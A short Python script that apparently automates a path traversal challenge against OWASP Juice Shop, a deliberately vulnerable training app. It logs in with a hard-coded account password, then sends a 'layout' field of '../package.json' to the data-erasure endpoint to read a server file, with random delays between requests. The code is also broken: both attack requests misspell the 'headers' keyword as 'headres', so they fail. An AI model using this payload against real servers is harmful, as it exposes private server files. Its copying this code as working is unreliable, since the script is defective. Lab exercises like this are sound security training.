import requests as r
import json
import time
import random
from config import config

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    #'Content-Type': 'application/json',
    'Origin': f'{config.JUICE_URL}/',
    'Connection': 'keep-alive',
    'Referer': f'{config.JUICE_URL}/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
}

def test_path_traversal():
    res = r.get(f"{config.JUICE_URL}/redirect?to=https://github.com/juice-shop/juice-shop")
    time.sleep(random.random() + random.randint(3,5))

    login = {
        'email': 'jim@juice-sh.op',
        'password': 'ncc-1701'
    }

    res = r.post(f'{config.JUICE_URL}/rest/user/login', headers=headers, json=login)
    token = json.loads(res.text.strip())['authentication']['token']

    auth_headers = headers
    auth_headers['Authorization'] = f'Bearer {token}'
    auth_headers['Cookie'] = f'token={token}'
    time.sleep(random.random() + random.randint(2,4))

    r.post(f"{config.JUICE_URL}/dataerasure", headres=auth_headers, data={'email':'jim@juice-sh.op', 'securityAnswer':'bob'})
    time.sleep(random.random() + random.randint(4,6))

    res = r.post(f"{config.JUICE_URL}/dataerasure", headres=auth_headers, data={'email':'jim@juice-sh.op', 'securityAnswer':'bob', 'layout':'../package.json'})
    assert '"description": "Probably the m' in res.text

